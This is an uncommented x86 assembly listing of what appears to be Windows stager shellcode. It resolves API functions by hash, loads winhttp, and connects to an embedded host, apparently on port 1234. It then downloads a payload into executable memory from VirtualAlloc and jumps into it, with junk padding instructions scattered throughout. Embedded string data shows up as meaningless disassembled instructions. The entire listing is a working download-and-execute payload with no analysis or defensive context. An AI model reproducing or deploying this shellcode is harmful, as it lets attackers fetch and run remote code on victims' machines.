```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    lea ebp, [esp]
    mov edx, 0
    test edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov edi, 0
    test edi, edi
    mov esi, dword ptr [edx + 0x28]
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    push eax
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    mov edi, 0
    test edi, edi
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    mov eax, 0
    test eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    mov ebx, 0
    test ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    push eax
    push ebx
    push 0x4d2
    call L_263
RET_c2:
    push 0x74007400
    add byte ptr [eax], dh
    jae L_cc
L_cc:
    cmp al, byte ptr [eax]
    das
    add byte ptr [edi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [edi], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], bh
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [ebx], dh
    add byte ptr [eax + eax], dh
    das
    add byte ptr [ebx], ch
    push edx
    add byte ptr [edx], dh
    dec edi
    add byte ptr [edi], bl
    arpl word ptr [eax], ax
    cmp byte ptr [eax], al
    je L_100
L_100:
    jb L_102
L_102:
    pop edi
    add byte ptr [eax + eax + 0x4f], cl
    add byte ptr [ebp], cl
    jae L_10c
L_10c:
    cmp byte ptr [eax], al
    jp L_110
L_110:
    jo L_112
L_112:
    push 0
    insb byte ptr es:[edi], dx
    add byte ptr [eax + eax + 0x33], dh
    add byte ptr [ecx], dl
    xor al, byte ptr [eax]
    inc esi
    add byte ptr [0x63007200], ch
    add byte ptr [eax + eax + 0x57], dl
    add byte ptr [eax + eax + 0x74], cl
    add byte ptr [ebx], dl
    dec ecx
    add byte ptr [esi], dl
    pop edx
    add byte ptr [0x68006400], ch
    add byte ptr [ecx], cl
    js L_140
L_140:
    cmp dword ptr [eax], eax
    jbe L_144
L_144:
    pop edi
    add byte ptr [ebx], ah
    add byte ptr fs:[edx], al
    push esp
    add byte ptr [esi], dh
    insd dword ptr es:[edi], dx
    add byte ptr [ebp], al
    jb L_156
L_156:
    inc edx
    add byte ptr [ecx], bl
    dec esi
    add byte ptr [ebx], dh
    add byte ptr [edi], dh
    je L_162
L_162:
    je L_164
L_164:
    imul eax, dword ptr [eax], 0x74
    add byte ptr [ecx], ch
    outsd dx, dword ptr [esi]
    add byte ptr [edx], dh
    add byte ptr [eax], al
    .byte 0x00, 0x83
L_170:
    .byte 0xC7, 0x2C, 0x50, 0x68
    inc esi
    wait
    push ds
    ret 0xd5ff
    push 0x800100
    push ebx
    push ebx
    push ebx
    push edi
    push ebx
    push eax
    push 0x5bb31098
    call ebp
    xchg esi, eax
    sub esp, 0x10
    mov eax, esp
    push edi
    mov edi, eax
    push edi
    push 0x600ba721
    call ebp
    test eax, eax
    je L_1ef
    mov eax, dword ptr [edi + 4]
    test eax, eax
    je L_1d3
    pop edx
    sub edx, 0x2c
    push 1
    push ebx
    push ebx
    push eax
    push 3
    push 3
    mov eax, esp
    sub esp, 0xc
    mov edi, esp
    push edi
    push eax
    push edx
    lea eax, [esp + 0x40]
    push dword ptr [eax]
    push 0x49eaddda
    call ebp
    test eax, eax
    je L_1ef
    jmp L_1e2
L_1d3:
    mov eax, dword ptr [edi + 8]
    test eax, eax
    je L_1ef
    push 4
    pop eax
    add edi, eax
    dec eax
    mov dword ptr [edi], eax
L_1e2:
    push 0xc
    push edi
    push 0x26
    push esi
    push 0xce9d58d3
    call ebp
L_1ef:
    push 0x3300
    mov eax, esp
    push 4
    push eax
    push 0x1f
    push esi
    push 0xce9d58d3
    call ebp
    push 0xa
    pop edi
L_206:
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x91bb5895
    call ebp
    test eax, eax
    jne L_220
    dec edi
    jne L_206
L_21b:
    call L_27d
L_220:
    push ebx
    push esi
    push 0x709d8805
    call ebp
    test eax, eax
    je L_21b
    push 0x40
    push 0x1000
    push 0x400000
    push ebx
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    mov edi, esp
L_246:
    push edi
    push 0x2000
    push ebx
    push esi
    push 0x7e24296c
    call ebp
    test eax, eax
    je L_21b
    mov eax, dword ptr [edi]
    add ebx, eax
    test eax, eax
    jne L_246
    pop eax
    ret
L_263:
    pop edi
    call L_170
    xor dword ptr [eax], eax
    xor al, byte ptr [eax]
    aaa
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [eax], al
    .byte 0x00
L_27d:
    .byte 0xBB, 0xF0, 0xB5, 0xA2, 0x56
    push 0
    push ebx
    call ebp
```